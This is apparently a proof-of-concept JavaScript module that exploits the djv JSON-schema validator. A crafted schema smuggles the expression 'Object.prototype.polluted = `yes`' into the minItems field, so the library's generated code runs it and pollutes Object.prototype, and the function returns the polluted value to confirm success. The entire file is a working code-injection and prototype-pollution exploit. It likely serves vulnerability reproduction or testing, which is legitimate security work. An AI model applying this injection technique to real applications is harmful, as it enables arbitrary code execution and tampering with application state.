function exploitFunction(payload) {
    const djv = require("djv");

    try {
        const env = new djv();
        const evilSchema = JSON.parse(
            '{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}'
        );
        env.addSchema("test", evilSchema);
        env.validate("test#/common", { type: "custom" });
    } catch (error) {}

    // Return the polluted value to verify
    return { polluted: Object.prototype.polluted };
}

module.exports = { exploitFunction };